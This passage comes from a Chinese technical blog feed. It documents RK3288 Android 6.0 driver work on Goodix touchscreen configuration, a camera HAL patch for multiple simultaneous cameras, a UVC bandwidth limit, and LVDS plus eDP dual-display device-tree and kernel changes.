&lt;1&gt;;                goodix,swap-x2y = &lt;0&gt;;                goodix,esd-protect = &lt;1&gt;;                goodix,auto-update-cfg = &lt;0&gt;;                goodix,power-off-sleep = &lt;0&gt;;                goodix,pen-suppress-finger = &lt;0&gt;;                //goodix,cfg-group0 = [53 D0 02 00];        &#125;;&#125;;</code></pre><p>其中有些参数必须要修改，比如 <code>reset-gpios</code>, <code>irq-gpios</code>, 需要改为与触摸屏复位及中断引脚匹配的 <code>gpio</code>. 其它参数根据情况进行修改。</p><ul><li><code>reset-gpios</code>: 复位引脚，参考旧的配置，或者根据原理图设置</li><li><code>irq-gpios</code>: 中断引脚，参考旧的配置，或者根据原理图设置</li><li><code>touchscreen-size-x</code>: 屏幕 x 方向分辨率, 此处如果注释掉会使用 <code>gt9xx.h</code> 中的默认值</li><li><code>touchscreen-size-y</code>: 屏幕 y 方向分辨率, 此处如果注释掉会使用 <code>gt9xx.h</code> 中的默认值</li><li><code>driver-send-cfg</code>: 启用后会发送配置参数，默认从 dts 获取，对应 <code>goodix,cfg-group0</code></li><li><code>swap-x2y</code>: 交换屏幕x, y的方向，如果发现触摸屏的方向反了，需要修改这个值</li><li><code>goodix,cfg-group0</code>: 屏幕配置参数，由厂商提供，如果不确定就把 <code>goodix,driver-send-cfg</code> 置为0.</li></ul><blockquote><p><code>goodix,cfg-group0</code> 这个数组如果数据不对很可能导致触摸屏异常, 所以写入前先备份，在不打开 <code>driver-send-cfg</code> 的情况下启动板子，然后通过 <code>/proc/gt9xx_config</code> 获取当前配置。</p></blockquote><p>其它参数默认不需要修改。</p><p>如果一切正常的话，编译烧录后触摸屏就可以正常使用了。</p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><ul><li>如果触摸时x, y方向反了，需要改一下 <code>goodix,swap-x2y</code> </li><li>如果触摸屏可以响应操作，方向正常，但是位置不对，大概率是配置参数有误，需要写入正确的配置</li><li>出现大量异常log <code>rockchip_i2c ff160000.i2c: Warning: addr[0x005d] msg[0].scl_rate( = 0Khz ) is too low!</code>, 需要添加 <code>scl_rate</code></li></ul><pre><code class="c">--- a/drivers/input/touchscreen/gt9xx_v2.8.0.2/gt9xx.c+++ b/drivers/input/touchscreen/gt9xx_v2.8.0.2/gt9xx.c@@ -68,9 +68,11 @@ int gtp_i2c_read(struct i2c_client *client, u8 *buf, int len)                        .flags = !I2C_M_RD,                        .buf = &amp;addr_buf[0],                        .len = GTP_ADDR_LENGTH,+                       .scl_rate = 300 * 1000,                &#125;, &#123;                        .addr = client-&gt;addr,                        .flags = I2C_M_RD,+                       .scl_rate = 300 * 1000,                &#125;        &#125;;@@ -140,6 +142,7 @@ int gtp_i2c_write(struct i2c_client *client, u8 *buf, int len)        struct i2c_msg msg = &#123;                        .addr = client-&gt;addr,                        .flags = !I2C_M_RD,+                       .scl_rate = 300 * 1000,        &#125;;        if (likely(len &lt; sizeof(put_buf))) &#123;</code></pre><ul><li>该版本驱动默认从 <code>dts</code>  读取屏幕配置，当然也可以从头文件 <code>gt9xx.h</code> 获取，不过对应的要将 <code>gt9xx.c</code> 函数 <code>gtp_find_valid_cfg_data</code> 中关于 <code>CONFIG_OF</code> 的判断注释掉。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
            <tag> rk3288 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RK3288 android 6.0 同时打开两个摄像头</title>
      <link href="2021/07/12/dual-camera/"/>
      <url>2021/07/12/dual-camera/</url>
      
        <content type="html"><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><ul><li>平台: RK3288</li><li>系统: Android 6.0</li><li>需求: 同时打开两个摄像头</li></ul><p>业务需求，要支持同时打开多个摄像头，期间遇到一些问题，在这里记录下。</p><h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><h3 id="支持多摄像头"><a href="#支持多摄像头" class="headerlink" title="支持多摄像头"></a>支持多摄像头</h3><p>首先，Android系统默认只支持同时打开一个摄像头，并且最大只识别两个摄像头。所以，为了支持多摄像头，需要修改摄像头相关的 <code>HAL</code> 层。</p><p>这个我参考 <a href="https://www.programmersought.com/article/12481783276/">[AndroidO] [RK3399] Support 4 way camera preview</a> 解决了。patch 如下：</p><pre><code class="c">diff --git a/device/rockchip/common/ueventd.rockchip.rc b/device/rockchip/common/ueventd.rockchip.rcindex 7316ebf..e73da8d 100755--- a/device/rockchip/common/ueventd.rockchip.rc+++ b/device/rockchip/common/ueventd.rockchip.rc@@ -19,6 +19,23 @@ /dev/video1               0660   media      camera /dev/video2               0660   media      camera /dev/video3               0660   media      camera+/dev/video4               0660   media      camera+/dev/video5               0660   media      camera+/dev/video6               0660   media      camera+/dev/video7               0660   media      camera+/dev/video8               0660   media      camera+/dev/video9               0660   media      camera+/dev/video10              0660   media      camera+/dev/video11              0660   media      camera+/dev/video12              0660   media      camera+/dev/video13              0660   media      camera+/dev/video14              0660   media      camera+/dev/video15              0660   media      camera+/dev/video16              0660   media      camera+/dev/video17              0660   media      camera+/dev/video18              0660   media      camera+/dev/video19              0660   media      camera+/dev/video20              0660   media      camera /dev/pmem_cam             0660   system     camera /dev/vpu                  0660   system     system /dev/vpu_service          0666   media      mediadiff --git a/hardware/rockchip/camera/CameraHal/CameraHal_Module.cpp b/hardware/rockchip/camera/CameraHal/CameraHal_Module.cppindex 3365339..012d14e 100755--- a/hardware/rockchip/camera/CameraHal/CameraHal_Module.cpp+++ b/hardware/rockchip/camera/CameraHal/CameraHal_Module.cpp@@ -712,9 +712,10 @@ int usb_camera_hotplug(void)                      (strcmp(usbcameraPlug, &quot;remove&quot;) == 0);     return plugstate; &#125;-+//modify by fujianyong for [Supporting multiple cameras] start int camera_get_number_of_cameras(void) &#123;+    char cam_sys[40];     char cam_path[20];     char cam_num[3],i;     int cam_cnt=0,fd=-1,rk29_cam[CAMERAS_SUPPORT_MAX];@@ -770,9 +771,11 @@ int camera_get_number_of_cameras(void)         delete camEngVerItf;      &#125;-    -    memset(&amp;camInfoTmp[0],0x00,sizeof(rk_cam_info_t));-    memset(&amp;camInfoTmp[1],0x00,sizeof(rk_cam_info_t));+    for(int i=0;i&lt;CAMERAS_SUPPORT_MAX;i++)&#123;+        memset(&amp;camInfoTmp[i],0x00,sizeof(rk_cam_info_t));+    &#125;+    //memset(&amp;camInfoTmp[0],0x00,sizeof(rk_cam_info_t));+    //memset(&amp;camInfoTmp[1],0x00,sizeof(rk_cam_info_t));      profiles = camera_board_profiles::getInstance();     nCamDev = profiles-&gt;mDevieVector.size();@@ -787,18 +790,18 @@ int camera_get_number_of_cameras(void)             if(profiles-&gt;mDevieVector[i]-&gt;mIsConnect==1)&#123;                 rk_sensor_info *pSensorInfo = &amp;(profiles-&gt;mDevieVector[i]-&gt;mHardInfo.mSensorInfo);                 -                camInfoTmp[cam_cnt&amp;0x01].pcam_total_info = profiles-&gt;mDevieVector[i];     -                strncpy(camInfoTmp[cam_cnt&amp;0x01].device_path, pSensorInfo-&gt;mCamsysDevPath, sizeof(camInfoTmp[cam_cnt&amp;0x01].device_path));-                strncpy(camInfoTmp[cam_cnt&amp;0x01].driver, pSensorInfo-&gt;mSensorDriver, sizeof(camInfoTmp[cam_cnt&amp;0x01].driver));+                camInfoTmp[cam_cnt].pcam_total_info = profiles-&gt;mDevieVector[i];+                strncpy(camInfoTmp[cam_cnt].device_path, pSensorInfo-&gt;mCamsysDevPath, sizeof(camInfoTmp[cam_cnt].device_path));+                strncpy(camInfoTmp[cam_cnt].driver, pSensorInfo-&gt;mSensorDriver, sizeof(camInfoTmp[cam_cnt].driver));                 unsigned int SensorDrvVersion = profiles-&gt;mDevieVector[i]-&gt;mLoadSensorInfo.mpI2cInfo-&gt;sensor_drv_version;                 memset(version,0x00,sizeof(version));                 sprintf(version,&quot;%d.%d.%d&quot;,((SensorDrvVersion&amp;0xff0000)&gt;&gt;16),                         ((SensorDrvVersion&amp;0xff00)&gt;&gt;8),SensorDrvVersion&amp;0xff);                                           if(pSensorInfo-&gt;mFacing == RK_CAM_FACING_FRONT)&#123;     -                    camInfoTmp[cam_cnt&amp;0x01].facing_info.facing = CAMERA_FACING_FRONT;                    +                    camInfoTmp[cam_cnt].facing_info.facing = CAMERA_FACING_FRONT;                 &#125; else &#123;-                    camInfoTmp[cam_cnt&amp;0x01].facing_info.facing = CAMERA_FACING_BACK;+                    camInfoTmp[cam_cnt].facing_info.facing = CAMERA_FACING_BACK;                 &#125;                   memset(sensor_ver,0x00,sizeof(sensor_ver));@@ -808,7 +811,7 @@ int camera_get_number_of_cameras(void)                     sprintf(sensor_ver,&quot;%s&quot;,pSensorInfo-&gt;mSensorName);                                 property_set(sensor_ver, version);                     -                camInfoTmp[cam_cnt&amp;0x01].facing_info.orientation = pSensorInfo-&gt;mOrientation;+                camInfoTmp[cam_cnt].facing_info.orientation = pSensorInfo-&gt;mOrientation;                 cam_cnt++;                  unsigned int CamsysDrvVersion = profiles-&gt;mDevieVector[i]-&gt;mCamsysVersion.drv_ver;@@ -833,13 +836,34 @@ int camera_get_number_of_cameras(void)             i++;         &#125;         -        for (i=0; i&lt;10; i++) &#123;+        for (i=0; i&lt;20; i++) &#123;             cam_path[0] = 0x00;-            unsigned int pix_format_tmp = V4L2_PIX_FMT_NV12;-            strcat(cam_path, CAMERA_DEVICE_NAME);+            //unsigned int pix_format_tmp = V4L2_PIX_FMT_NV12;+            //strcat(cam_path, CAMERA_DEVICE_NAME);+            cam_sys[0] = 0x00;+            strcat(cam_sys, CAM_SYS_NAME);             sprintf(cam_num, &quot;%d&quot;, i);+            strcat(cam_sys,cam_num);+            strcat(cam_sys,&quot;/index&quot;);+            FILE* ifp;+            ifp = fopen(cam_sys, &quot;r&quot;);+            if (ifp == NULL)&#123;+                LOGD(&quot;fail to open sys file:%s&quot;,cam_sys);+                continue;+            &#125;+            unsigned char index;+            fread(&amp;index, sizeof(char),1, ifp);+            fclose(ifp);+            LOGD(&quot;open %s index %x&quot;,cam_sys,index);+            if(index == 0x31)&#123;+                LOGD(&quot;%s wrong index continue&quot;,cam_sys);+                continue;+            &#125;+            strcat(cam_path, CAMERA_DEVICE_NAME);+             strcat(cam_path,cam_num);             fd = open(cam_path, O_RDONLY);+            unsigned int pix_format_tmp = V4L2_PIX_FMT_NV12;             if (fd &lt; 0) &#123;                 LOGE(&quot;Open %s failed! strr: %s&quot;,cam_path,strerror(errno));                 break;@@ -856,31 +880,31 @@ int camera_get_number_of_cameras(void)                 LOGD(&quot;Video device(%s): video capture not supported.\n&quot;,cam_path);             &#125; else &#123;                 rk_cam_total_info* pNewCamInfo = new rk_cam_total_info();-                memset(camInfoTmp[cam_cnt&amp;0x01].device_path,0x00, sizeof(camInfoTmp[cam_cnt&amp;0x01].device_path));-                strcat(camInfoTmp[cam_cnt&amp;0x01].device_path,cam_path);-                memset(camInfoTmp[cam_cnt&amp;0x01].fival_list,0x00, sizeof(camInfoTmp[cam_cnt&amp;0x01].fival_list));-                memcpy(camInfoTmp[cam_cnt&amp;0x01].driver,capability.driver, sizeof(camInfoTmp[cam_cnt&amp;0x01].driver));-                camInfoTmp[cam_cnt&amp;0x01].version = capability.version;+                memset(camInfoTmp[cam_cnt].device_path,0x00, sizeof(camInfoTmp[cam_cnt].device_path));+                strcat(camInfoTmp[cam_cnt].device_path,cam_path);+                memset(camInfoTmp[cam_cnt].fival_list,0x00, sizeof(camInfoTmp[cam_cnt].fival_list));+                memcpy(camInfoTmp[cam_cnt].driver,capability.driver, sizeof(camInfoTmp[cam_cnt].driver));+                camInfoTmp[cam_cnt].version = capability.version;                 if (strstr((char*)&amp;capability.card[0], &quot;front&quot;) != NULL) &#123;-                    camInfoTmp[cam_cnt&amp;0x01].facing_info.facing = CAMERA_FACING_FRONT;+                    camInfoTmp[cam_cnt].facing_info.facing = CAMERA_FACING_FRONT; #ifdef LAPTOP                 &#125; else if (strstr((char*)&amp;capability.card[0], &quot;HP HD&quot;) != NULL                     || strstr((char*)&amp;capability.card[0], &quot;HP IR&quot;)) &#123;-                    camInfoTmp[cam_cnt&amp;0x01].facing_info.facing = CAMERA_FACING_FRONT;+                    camInfoTmp[cam_cnt].facing_info.facing = CAMERA_FACING_FRONT;                     if (strstr((char*)&amp;capability.card[0], &quot;HP IR&quot;))                         gCamerasUnavailabled++;-                    gUsbCameraNames[cam_cnt&amp;0x01] = String8((char*)&amp;capability.card[0]);-                    LOGD(&quot;Camera %d name: %s&quot;, (cam_cnt&amp;0x01), gUsbCameraNames[cam_cnt&amp;0x01].string());+                    gUsbCameraNames[cam_cnt] = String8((char*)&amp;capability.card[0]);+                    LOGD(&quot;Camera %d name: %s&quot;, (cam_cnt), gUsbCameraNames[cam_cnt].string()); #endif                 &#125; else &#123;-                    camInfoTmp[cam_cnt&amp;0x01].facing_info.facing = CAMERA_FACING_BACK;+                    camInfoTmp[cam_cnt].facing_info.facing = CAMERA_FACING_BACK;                 &#125;                   ptr = strstr((char*)&amp;capability.card[0],&quot;-&quot;);                 if (ptr != NULL) &#123;                     ptr++;-                    camInfoTmp[cam_cnt&amp;0x01].facing_info.orientation = atoi(ptr);+                    camInfoTmp[cam_cnt].facing_info.orientation = atoi(ptr);                 &#125; else &#123;-                    camInfoTmp[cam_cnt&amp;0x01].facing_info.orientation = 0;+                    camInfoTmp[cam_cnt].facing_info.orientation = 0;                 &#125;                  memset(version,0x00,sizeof(version));@@ -1168,7 +1192,7 @@ int camera_get_number_of_cameras(void)                 camInfoTmp[cam_cnt].pcam_total_info = pNewCamInfo;                 cam_cnt++;                 if (cam_cnt &gt;= CAMERAS_SUPPORT_MAX)-                    i = 10;+                    i = 20;             &#125;     loop_continue:             if (fd &gt; 0) &#123;@@ -1215,8 +1239,11 @@ int camera_get_number_of_cameras(void)     &#125;     #endif     -    memcpy(&amp;gCamInfos[0], &amp;camInfoTmp[0], sizeof(rk_cam_info_t));-    memcpy(&amp;gCamInfos[1], &amp;camInfoTmp[1], sizeof(rk_cam_info_t));+    //memcpy(&amp;gCamInfos[0], &amp;camInfoTmp[0], sizeof(rk_cam_info_t));+    //memcpy(&amp;gCamInfos[1], &amp;camInfoTmp[1], sizeof(rk_cam_info_t));+    for(int i=0;i&lt;CAMERAS_SUPPORT_MAX;i++)&#123;+        memcpy(&amp;gCamInfos[i], &amp;camInfoTmp[i], sizeof(rk_cam_info_t));+    &#125;       property_get(&quot;ro.sf.hwrotation&quot;, property, &quot;0&quot;);@@ -1240,7 +1267,7 @@ camera_get_number_of_cameras_end: #else     return gCamerasNumber; #endif-&#125;+&#125;//modify by fujianyong for [Supporting multiple cameras] end  #if 0 int camera_get_number_of_cameras(void)diff --git a/hardware/rockchip/camera/CameraHal/CameraHal_Module.h b/hardware/rockchip/camera/CameraHal/CameraHal_Module.hindex 45c81ec..3927ddf 100755--- a/hardware/rockchip/camera/CameraHal/CameraHal_Module.h+++ b/hardware/rockchip/camera/CameraHal/CameraHal_Module.h@@ -11,13 +11,14 @@ using namespace android; #define CAMERA_DEFAULT_PREVIEW_FPS_MIN    8000        //8 fps #define CAMERA_DEFAULT_PREVIEW_FPS_MAX    15000 #endif-#define CAMERAS_SUPPORT_MAX             2+#define CAMERAS_SUPPORT_MAX             4 #if defined(TARGET_RK3399)-    #define CAMERAS_SUPPORTED_SIMUL_MAX     2+    #define CAMERAS_SUPPORTED_SIMUL_MAX     4 #else     #define CAMERAS_SUPPORTED_SIMUL_MAX     1 #endif #define CAMERA_DEVICE_NAME              &quot;/dev/video&quot;+#define CAM_SYS_NAME                    &quot;/sys/class/video4linux/video&quot; #define CAMERA_MODULE_NAME              &quot;RK29_ICS_CameraHal_Module&quot;  typedef struct rk_cam_info_s &#123;</code></pre><p>通过该 <code>patch</code> 就支持了4个摄像头。</p><h3 id="带宽不足"><a href="#带宽不足" class="headerlink" title="带宽不足"></a>带宽不足</h3><p>加入以上patch后，确实可以同时识别多个摄像头，但是同时预览不一定成功，我测试了多组摄像头，不同组合结果不一样，有成功的，也有失败的。</p><p>失败的时候，会报以下错误。</p><pre><code class="bash">uvcvideo: Failed to submit URB 0 (-28).</code></pre><p>错误码 <code>28</code> 说明空间不足，这个可以从头文件 <code>errno.h</code> 中查找到其定义。搜索发现与 USB 带宽分配相关。使用 <code>lsusb</code> 可以看到</p><pre><code class="bash">Bus 001 Device 002: ID 1a40:0101Bus 003 Device 002: ID 0bda:0179Bus 001 Device 001: ID 1d6b:0002Bus 002 Device 001: ID 1d6b:0002Bus 003 Device 001: ID 1d6b:0002Bus 001 Device 003: ID 058f:5608Bus 001 Device 004: ID 058f:5608</code></pre><p>最后两个对应摄像头，使用的是同一个usb bus，对应同一个usb控制器。</p><blockquote><p>usb 2.0 速率为480Mbps，一个摄像头占用带宽可以粗略估算：<code>长(640)*宽(480)*帧率(30)*像素点数据长度(24) + 协议头部</code></p></blockquote><p>调试许久，最后通过添加kernel调试代码，打印带宽信息，对比成功和失败的案例，最终确定是出错摄像头默认配置带宽过高导致的，解决方案如下：</p><pre><code class="c">diff --git a/drivers/media/usb/uvc/uvc_video.c b/drivers/media/usb/uvc/uvc_video.cindex 669d81c..b1b381e 100644--- a/drivers/media/usb/uvc/uvc_video.c+++ b/drivers/media/usb/uvc/uvc_video.c@@ -1684,6 +1684,11 @@ static int uvc_init_video(struct uvc_streaming *stream, gfp_t gfp_flags)                /* Isochronous endpoint, select the alternate setting. */                bandwidth = stream-&gt;ctrl.dwMaxPayloadTransferSize; +               if (bandwidth &gt; UVC_LIMITED_BANDWIDTH) &#123;+                       printk(KERN_ERR &quot;UVC_DBG: limit bandwidth from %d to %d \n&quot;,+                              bandwidth, UVC_LIMITED_BANDWIDTH);+                       bandwidth = UVC_LIMITED_BANDWIDTH;+               &#125;                if (bandwidth == 0) &#123;                        uvc_trace(UVC_TRACE_VIDEO, &quot;Device requested null &quot;                                &quot;bandwidth, defaulting to lowest.\n&quot;);diff --git a/drivers/media/usb/uvc/uvcvideo.h b/drivers/media/usb/uvc/uvcvideo.hindex 033c775..86d11f4 100644--- a/drivers/media/usb/uvc/uvcvideo.h+++ b/drivers/media/usb/uvc/uvcvideo.h@@ -142,6 +142,9 @@ #define UVC_FMT_FLAG_COMPRESSED                0x00000001 #define UVC_FMT_FLAG_STREAM            0x00000002 +/* Limit bandwith */+#define UVC_LIMITED_BANDWIDTH   800+ /* ------------------------------------------------------------------------  * Structures.  */</code></pre><p>以上 <code>bandwidth</code> 在出错情况下为 <code>3072</code>, 不出错的摄像头对应 <code>800</code>, 因此我将其限制在 <code>800</code>, 重新编译后解决问题。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://www.programmersought.com/article/12481783276/">[AndroidO] [RK3399] Support 4 way camera preview</a></li><li><a href="https://blog.csdn.net/weixin_41944449/article/details/80600428">uvc camera在usb带宽不足的情况下，如何正常出图</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> android </tag>
            
            <tag> rk3288 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RK3288 android 6.0 实现 lvds + edp 双屏异显</title>
      <link href="2021/06/18/dual-lcd/"/>
      <url>2021/06/18/dual-lcd/</url>
      
        <content type="html"><![CDATA[<p><code>rk3288</code> 默认支持 edp+hdmi 双屏显示，或者 lvds + hdmi, 但不支持 <code>lvds</code> + <code>edp</code> 双屏异显。业务要求，需要使用RK3288 Android 6.0 系统，支持 <code>lvds</code>, <code>edp</code> 两种接口的双屏异显。本文介绍具体的实现方法。</p><ul><li>平台: RK3288</li><li>系统: Android 6.0</li><li>屏幕: LVDS(7 inch 1024x600), edp(11 inch 1920x1080)</li><li>需求: LVDS (Primary) + edp (EXTEND) 双屏异显</li></ul><blockquote><p> 主屏副屏的切换只要修改dts相关参数即可，<code>lvds</code> <code>edp</code> 主副互换比较简单。</p></blockquote><h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h2><p>首先修改 <code>kernel</code>, 这里参考了博客<a href="https://blog.csdn.net/kris_fei/article/details/78646966">[RK3288][Android6.0] 调试笔记 --- 双屏显示内核Patch</a> , 具体细节会有差异。</p><h3 id="dts"><a href="#dts" class="headerlink" title="dts"></a>dts</h3><p>首先配置dts , 两个屏幕的参数分别放置在一个 <code>dtsi</code> 文件中。</p><h4 id="lvds-dts"><a href="#lvds-dts" class="headerlink" title="lvds dts"></a>lvds dts</h4><ul><li><code>arch/arm/boot/dts/lcd-lvds-1024x600_dual.dtsi</code></li></ul><pre><code class="c">display-timings &#123;    native-mode = &lt;&amp;timing0&gt;;    // 7&quot; 1024x600 LVDS panel    timing0: timing0 &#123;        screen-type = &lt;SCREEN_LVDS&gt;;        lvds-format = &lt;LVDS_8BIT_1&gt;;        out-face    = &lt;OUT_D888_P666&gt;;        color-mode = &lt;COLOR_RGB&gt;;        clock-frequency = &lt;52000000&gt;;        hactive = &lt;1024&gt;;        vactive = &lt;600&gt;;        hback-porch = &lt;150&gt;;        hfront-porch = &lt;160&gt;;        vback-porch = &lt;22&gt;;        vfront-porch = &lt;12&gt;;        hsync-len = &lt;10&gt;;        vsync-len = &lt;1&gt;;        hsync-active = &lt;0&gt;;        vsync-active = &lt;0&gt;;        de-active = &lt;0&gt;;        pixelclk-active = &lt;1&gt;;        swap-rb = &lt;0&gt;;        swap-rg = &lt;0&gt;;        swap-gb = &lt;0&gt;;    &#125;;&#125;;</code></pre><h4 id="edp-dts"><a href="#edp-dts" class="headerlink" title="edp dts"></a>edp dts</h4><ul><li><code>arch/arm/boot/dts/lcd-1920x1080_dual.dtsi</code></li></ul><pre><code class="c">disp_timings: display-timings &#123;    native-mode = &lt;&amp;timing2&gt;;    // 11.6&quot; 1920x1080 eDP panel    timing2: timing2 &#123;        screen-type = &lt;SCREEN_EDP&gt;;        out-face    = &lt;OUT_P888&gt;;        clock-frequency = &lt;138700000&gt;;        hactive = &lt;1920&gt;;        vactive = &lt;1080&gt;;        hback-porch = &lt;35&gt;;        hfront-porch = &lt;120&gt;;        vback-porch = &lt;10&gt;;        vfront-porch = &lt;20&gt;;        hsync-len = &lt;5&gt;;        vsync-len = &lt;2&gt;;        hsync-active = &lt;0&gt;;        vsync-active = &lt;0&gt;;        de-active = &lt;0&gt;;        pixelclk-active = &lt;1&gt;;        swap-rb = &lt;0&gt;;        swap-rg = &lt;0&gt;;        swap-gb = &lt;0&gt;;    &#125;;&#125;;</code></pre><h4 id="lcd-b116xan-dtsi"><a href="#lcd-b116xan-dtsi" class="headerlink" title="lcd-b116xan.dtsi"></a>lcd-b116xan.dtsi</h4><p>上面定义好了 <code>disp_timings</code>, 原有的 <code>lcd-b116xan.dtsi</code> 中的定义就不需要了。</p><pre><code class="c">diff --git a/arch/arm/boot/dts/lcd-b116xan.dtsi b/arch/arm/boot/dts/lcd-b116xan.dtsiindex 271364e..4b5ee39 100644--- a/arch/arm/boot/dts/lcd-b116xan.dtsi+++ b/arch/arm/boot/dts/lcd-b116xan.dtsi@@ -23,7 +23,7 @@         enable-gpios = &lt;&amp;gpio7 GPIO_A2 GPIO_ACTIVE_HIGH&gt;;     &#125;; -    disp_timings: display-timings &#123;+/*    disp_timings: display-timings &#123;         //native-mode = &lt;&amp;timing0&gt;;         // 7&quot; 1024x600 LVDS panel         timing0: timing0 &#123;@@ -138,6 +138,6 @@             swap-rg = &lt;0&gt;;             swap-gb = &lt;0&gt;;         &#125;;-    &#125;;+    &#125;; */ &#125;; </code></pre><h4 id="rk3288-tb-8846-dts"><a href="#rk3288-tb-8846-dts" class="headerlink" title="rk3288-tb_8846.dts"></a>rk3288-tb_8846.dts</h4><p>接下来是重头，就是 <code>rk3288</code> 的dts，添加了两个屏幕的配置，禁用了 <code>hdmi</code>, 配置 lvds 和 edp，并将 <code>lvds</code> 设为主屏。</p><pre><code class="c">diff --git a/arch/arm/boot/dts/rk3288-tb_8846.dts b/arch/arm/boot/dts/rk3288-tb_8846.dtsindex 8ed4044..6cac1c9 100644--- a/arch/arm/boot/dts/rk3288-tb_8846.dts+++ b/arch/arm/boot/dts/rk3288-tb_8846.dts@@ -518,7 +518,7 @@     &#125;;      goodix_ts@5d &#123;-        status = &quot;disabled&quot;;+        //status = &quot;disabled&quot;;         compatible = &quot;goodix,gt1x&quot;, &quot;goodix,gt9xx&quot;;        // gt5688, gt911         reg = &lt;0x5d&gt;;         goodix,rst-gpio = &lt;&amp;gpio7 GPIO_A5 GPIO_ACTIVE_LOW&gt;;@@ -532,17 +532,62 @@ &#125;;  &amp;fb &#123;-    rockchip,disp-mode = &lt;DUAL&gt;;-    rockchip,uboot-logo-on = &lt;1&gt;;+    rockchip,disp-mode = &lt;DUAL_LCD&gt;;+    rockchip,uboot-logo-on = &lt;0&gt;;     rockchip,disp-policy = &lt;DISPLAY_POLICY_BOX&gt;; &#125;; -&amp;disp_timings &#123;-    native-mode = &lt;&amp;timing2&gt;;    // timing0:7&quot;LVDS1024x600; timing1:11.6&quot;LVDS1366x768; timing2:11.6&quot;eDP1920x1080; timing4:10.1&quot;LVDS1280x800-&#125;;+//&amp;disp_timings &#123;+//    native-mode = &lt;&amp;timing2&gt;;    // timing0:7&quot;LVDS1024x600; timing1:11.6&quot;LVDS1366x768; timing2:11.6&quot;eDP1920x1080; timing4:10.1&quot;LVDS1280x800+//&#125;;  &amp;rk_screen &#123;-     display-timings = &lt;&amp;disp_timings&gt;;+    //display-timings = &lt;&amp;disp_timings&gt;;+    status = &quot;okay&quot;;+    screen0 &#123;+        screen_prop = &lt;EXTEND&gt;;+        native-mode = &lt;DEFAULT_MODE&gt;;+        power_ctr &#123;+            lcd_en &#123;+                rockchip,power_type = &lt;GPIO&gt;;+                gpios = &lt;&amp;gpio7 GPIO_A3 GPIO_ACTIVE_HIGH&gt;;+                rockchip,delay = &lt;10&gt;;+            &#125;;+            /*lcd_cs &#123;+                rockchip,power_type = &lt;GPIO&gt;;+                gpios = &lt;&amp;gpio7 GPIO_A4 GPIO_ACTIVE_HIGH&gt;;+                rockchip,delay = &lt;10&gt;;+            &#125;; */+        &#125;;+        #include &quot;lcd-edp-1920x1080_dual.dtsi&quot;+    &#125;;+    screen1 &#123;+        screen_prop = &lt;PRMRY&gt;;+        native-mode = &lt;DEFAULT_MODE&gt;;+        power_ctr &#123;+            lcd_en &#123;+                rockchip,power_type = &lt;GPIO&gt;;+                gpios = &lt;&amp;gpio7 GPIO_A3 GPIO_ACTIVE_HIGH&gt;;+                rockchip,delay = &lt;10&gt;;+            &#125;;+            /*lcd_cs &#123;+                rockchip,power_type = &lt;GPIO&gt;;+                gpios = &lt;&amp;gpio7 GPIO_A4 GPIO_ACTIVE_HIGH&gt;;+                rockchip,delay = &lt;10&gt;;+            &#125;; */+        &#125;;+        #include &quot;lcd-lvds-1024x600.dtsi&quot;+    &#125;;+&#125;;++&amp;lvds &#123;+    status = &quot;okay&quot;;+    prop = &lt;PRMRY&gt;;+&#125;;++&amp;edp &#123;+    status = &quot;okay&quot;;+    prop = &lt;EXTEND&gt;; &#125;;  /*lcdc0 as PRMRY(LCD),lcdc1 as EXTEND(HDMI)*/@@ -553,11 +598,11 @@     power_ctr: power_ctr &#123;         rockchip,debug = &lt;0&gt;; -        lcd_en:lcd_en &#123;+        /* lcd_en:lcd_en &#123;             rockchip,power_type = &lt;GPIO&gt;;             gpios = &lt;&amp;gpio7 GPIO_A3 GPIO_ACTIVE_HIGH&gt;;             rockchip,delay = &lt;10&gt;;-        &#125;;+        &#125;; */     &#125;; &#125;; @@ -568,7 +613,7 @@ &#125;;  &amp;hdmi &#123;-    status = &quot;okay&quot;;+    status = &quot;disabled&quot;;     rockchip,cec_enable = &lt;0&gt;;     rockchip,hdcp_enable = &lt;0&gt;;     rockchip,hdmi_audio_source = &lt;1&gt;;</code></pre><blockquote><p>这里将 <code>rockchip,uboot-logo-on</code> 设为0，是禁用 uboot  logo的意思，不禁用的话会导致开机异常，具体原因暂不清楚。</p></blockquote><h3 id="driver"><a href="#driver" class="headerlink" title="driver"></a>driver</h3><p><code>dts</code> 修改完了，接下来是驱动部分，这部分修改甚多，一定要注意。其实下面这个全局 <code>CONFIG_SMART_DUAL_LCD</code> 不是必须的，可以直接将宏定义的判断部分改为直接替换。</p><pre><code class="c">diff --git a/arch/arm/boot/dts/include/dt-bindings/rkfb/rk_fb.h b/arch/arm/boot/dts/include/dt-bindings/rkfb/rk_fb.hindex 6d75770..8b2ac5b 100755--- a/arch/arm/boot/dts/include/dt-bindings/rkfb/rk_fb.h+++ b/arch/arm/boot/dts/include/dt-bindings/rkfb/rk_fb.h@@ -12,6 +12,9 @@ #define NO_DUAL        0 #define ONE_DUAL    1 #define DUAL        2+#define DUAL_LCD    3+#define DEFAULT_MODE    0+ /******************************************************************** **          display output interface supported by rockchip       ** ********************************************************************/diff --git a/arch/arm/configs/rockchip_defconfig b/arch/arm/configs/rockchip_defconfigindex 3a48555..2481bd0 100644--- a/arch/arm/configs/rockchip_defconfig+++ b/arch/arm/configs/rockchip_defconfig@@ -394,6 +394,7 @@ CONFIG_RK_TRSM=y CONFIG_RK32_LVDS=y CONFIG_RK32_DP=y # CONFIG_RK_VGA is not set+CONFIG_SMART_DUAL_LCD=y CONFIG_RK_HDMI=y CONFIG_ROCKCHIP_RGA=y CONFIG_ROCKCHIP_RGA2=ydiff --git a/drivers/video/rockchip/Kconfig b/drivers/video/rockchip/Kconfigindex 6034139..39543bc 100755--- a/drivers/video/rockchip/Kconfig+++ b/drivers/video/rockchip/Kconfig@@ -58,6 +58,9 @@ config THREE_FB_BUFFER         